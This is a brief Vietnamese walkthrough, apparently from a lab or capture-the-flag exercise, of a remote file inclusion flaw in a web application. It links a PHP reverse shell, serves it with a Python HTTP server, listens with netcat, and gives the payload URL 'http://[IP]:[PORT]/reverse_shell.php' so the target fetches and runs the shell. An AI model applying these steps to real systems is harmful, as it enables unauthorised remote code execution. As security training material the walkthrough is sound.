Thử nhập `abc` thì có lỗi: 

![image](https://user-images.githubusercontent.com/92881216/227266357-c3ca5d53-5ea1-48a3-a51d-cef5378e5849.png)

Thử nhập payload: `https://www.google.com/` :

![image](https://user-images.githubusercontent.com/92881216/227265756-74868351-656c-40c3-82aa-18dfd2bfce54.png)

Như vậy ứng dụng web này cho phép include 1 web bên ngoài.

Khai thác tiếp bằng cách tạo 1 file reverse shell bằng <a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php" >php</a>

Sau đó khởi tạo 1 server đơn giản bằng python: `python3 -m http.server`

![image](https://user-images.githubusercontent.com/92881216/227264324-dfc63b63-cbe2-457a-a42e-2e37db9f28aa.png)

Bây giờ sử dụng `netcat` và nhập vào payload: `http://[IP]:[PORT]/reverse_shell.php`:

![image](https://user-images.githubusercontent.com/92881216/227264931-2e610ddb-8eae-4eb2-b33c-05506d396331.png)

![image](https://user-images.githubusercontent.com/92881216/227267393-634861ae-d0e0-44bc-9f6e-63f14b0eb945.png)

Kết quả: 

![image](https://user-images.githubusercontent.com/92881216/227267502-3b72c52b-b549-43dd-b899-94731101fa20.png)



